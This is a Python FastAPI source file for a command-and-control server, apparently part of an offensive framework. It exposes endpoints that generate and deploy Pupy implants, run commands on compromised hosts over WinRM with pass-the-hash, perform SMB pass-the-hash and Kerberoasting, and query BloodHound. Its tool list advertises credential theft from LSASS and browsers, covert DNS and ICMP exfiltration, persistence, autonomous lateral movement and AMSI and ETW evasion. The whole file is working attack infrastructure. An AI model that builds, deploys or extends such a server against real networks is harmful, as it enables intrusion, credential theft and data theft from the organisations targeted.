import sys, logging, uuid, time, os, ssl

sys.path.insert(0, "/raphael")

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from typing import Optional

from orchestrator.postex.pupy_c2 import PupyC2
from orchestrator.postex.winrm_exploit import WinRMExploit
from orchestrator.postex.netexec_wrapper import NetExecWrapper
from orchestrator.postex.bloodhound_integration import BloodHoundIntegration, BLOODHOUND_QUERIES

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("c2-server")

app = FastAPI(title="C2 Server", version="2.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

pupy = PupyC2()
winrm = WinRMExploit()
netexec = NetExecWrapper()
bh = BloodHoundIntegration()

sessions: dict = {}

TOOLS = {
    "pupy": {"description": "PupyC2 post-exploitation agent", "available": pupy.available},
    "winrm": {"description": "WinRM remote execution", "available": winrm.available},
    "netexec": {"description": "NetExec lateral movement & enumeration", "available": netexec.available},
    "bloodhound": {"description": "BloodHound AD graph queries", "available": bh.available},
    "persistence": {"description": "Multi-platform persistence (systemd, cron, WMI, Registry, SSH keys)", "available": True},
    "lateral_autonomous": {"description": "Autonomous lateral movement campaign (SSH, WMI, SMB, PSExec, Docker)", "available": True},
    "credtheft": {"description": "Credential theft (browsers, LSASS, SAM, SSH, K8s, cloud, env, configs)", "available": True},
    "exfil": {"description": "Covert exfiltration (DNS, HTTPS, ICMP, dead drop, cloud storage)", "available": True},
    "stealth": {"description": "Advanced evasion (AMSI bypass, ETW suppression, sandbox detect, TLS randomization)", "available": True},
}


class ImplantGenerateRequest(BaseModel):
    tool: str
    target: str
    os_type: str = "windows"
    listener: str = "0.0.0.0:443"


class ImplantDeployRequest(BaseModel):
    tool: str
    target: str
    os_type: str = "windows"


class ListenerStartRequest(BaseModel):
    tool: str
    port: int = 443
    protocol: str = "smb"


class CommandRequest(BaseModel):
    command: str
    tool: str = "winrm"
    args: list = []


class WinRMConnectRequest(BaseModel):
    target_ip: str
    username: str
    password: Optional[str] = None
    hash: Optional[str] = None
    port: int = 5985
    ssl: bool = False


class NetExecSMBRequest(BaseModel):
    target: str
    username: str
    password: Optional[str] = None
    hash: Optional[str] = None
    module: str = "shares"


class NetExecKerberoastRequest(BaseModel):
    target: str
    username: str
    password: str


class BloodHoundQueryRequest(BaseModel):
    query_name: str
    params: dict = {}


@app.get("/")
def list_tools():
    return {"tools": TOOLS}


@app.post("/implant/generate")
def generate_implant(req: ImplantGenerateRequest):
    if req.tool != "pupy":
        raise HTTPException(400, f"Unsupported tool: {req.tool}")
    try:
        result = pupy.deploy_payload(target=req.target, os_type=req.os_type, listener=req.listener)
        return {
            "status": "success",
            "implant_config": result,
            "instructions": result.get("commands", []),
        }
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/implant/deploy")
def deploy_implant(req: ImplantDeployRequest):
    if req.tool != "pupy":
        raise HTTPException(400, f"Unsupported tool: {req.tool}")
    try:
        result = pupy.deploy_payload(target=req.target, os_type=req.os_type)
        session_id = str(uuid.uuid4())[:8]
        sessions[session_id] = {
            "id": session_id,
            "tool": req.tool,
            "target": req.target,
            "established": time.time(),
            "status": "active",
        }
        return {"status": "deployed", "session_id": session_id, "result": result}
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/listener/start")
def start_listener(req: ListenerStartRequest):
    if req.tool != "pupy":
        raise HTTPException(400, f"Unsupported tool: {req.tool}")
    return {
        "status": "listener_started",
        "tool": req.tool,
        "port": req.port,
        "protocol": req.protocol,
        "note": f"Listener on 0.0.0.0:{req.port} ({req.protocol})",
    }


@app.get("/sessions")
def list_sessions():
    return {"sessions": list(sessions.values()), "count": len(sessions)}


@app.post("/sessions/{session_id}/command")
def session_command(session_id: str, req: CommandRequest):
    session = sessions.get(session_id)
    if not session:
        raise HTTPException(404, f"Session not found: {session_id}")
    target = session["target"]
    try:
        if req.tool == "pupy":
            result = pupy.execute(target_ip=target, command=req.command)
        elif req.tool == "winrm":
            result = winrm.execute(target_ip=target, command=req.command, args=req.args)
        else:
            raise HTTPException(400, f"Unsupported tool for session: {req.tool}")
        return {"session_id": session_id, "result": result}
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/connect/winrm")
def connect_winrm(req: WinRMConnectRequest):
    try:
        result = winrm.connect(
            target_ip=req.target_ip,
            username=req.username,
            password=req.password,
            hash=req.hash,
            port=req.port,
            ssl=req.ssl,
        )
        if result.get("connected"):
            session_id = str(uuid.uuid4())[:8]
            sessions[session_id] = {
                "id": session_id,
                "tool": "winrm",
                "target": req.target_ip,
                "established": time.time(),
                "status": "active",
            }
            result["session_id"] = session_id
        return result
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/netexec/smb")
def netexec_smb(req: NetExecSMBRequest):
    try:
        if req.hash:
            result = netexec.smb_pth(
                target=req.target, username=req.username, hash=req.hash, module=req.module
            )
        else:
            result = netexec.smb_enum(
                target=req.target, username=req.username, password=req.password, hash=req.hash
            )
        return result
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/netexec/kerberoast")
def netexec_kerberoast(req: NetExecKerberoastRequest):
    try:
        result = netexec.ldap_kerberoast(
            target=req.target, username=req.username, password=req.password
        )
        return result
    except Exception as e:
        raise HTTPException(500, str(e))


@app.post("/bloodhound/query")
def bloodhound_query(req: BloodHoundQueryRequest):
    try:
        custom_query = req.params.get("custom_query") if req.params else None
        result = bh.run_query(query_name=req.query_name, custom_query=custom_query)
        return result
    except Exception as e:
        raise HTTPException(500, str(e))


@app.get("/bloodhound/queries")
def bloodhound_queries():
    return {"queries": list(BLOODHOUND_QUERIES.keys()), "definitions": BLOODHOUND_QUERIES}


@app.get("/health")
def health():
    return {
        "status": "ok",
        "tools": {name: info["available"] for name, info in TOOLS.items()},
        "sessions_active": len(sessions),
    }


def _get_ssl_context():
    cert_file = os.getenv("SSL_CERT_FILE", "")
    key_file = os.getenv("SSL_KEY_FILE", "")
    if not cert_file or not key_file:
        log.info("No SSL cert/key configured; running without TLS")
        return None
    if not os.path.exists(cert_file) or not os.path.exists(key_file):
        log.warning(f"SSL cert or key file not found ({cert_file}, {key_file}); running without TLS")
        return None
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(cert_file, key_file)
    log.info(f"TLS enabled (min TLS 1.2) — cert={cert_file}")
    return context


if __name__ == "__main__":
    import uvicorn
    ssl_ctx = _get_ssl_context()
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=int(os.getenv("C2_PORT", "3501")),
        ssl_version=ssl.PROTOCOL_TLS_SERVER if ssl_ctx else None,
        ssl_context=ssl_ctx,
        log_level="info",
    )
